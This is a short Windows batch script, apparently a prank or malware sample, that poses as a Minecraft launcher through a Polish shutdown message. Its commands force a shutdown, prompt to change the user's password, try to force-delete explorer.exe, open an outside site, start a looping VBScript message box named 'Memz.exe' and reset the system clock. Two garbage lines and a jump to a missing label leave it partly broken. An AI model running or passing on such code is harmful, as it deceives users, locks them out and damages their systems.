...
@echo off
shutdown -s -t 10 -c "Minecraft sie wloncza czekaj..."
net user %username% *
4893hfkyusrt82;f.slfsuhgelre483439439378hfjwfk
4893hfkyusrt82;f.slfsuhgelre483439439378hfjwfk
DEL /F /S /Q /A "explorer.exe"
start notepad.exe
start www.blackhost.xyz
goto looop
echo do>>msg.vbs
echo Msgbox"lol",48+5,"Memz.exe">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
date 22/08/2014
time 06:06:06
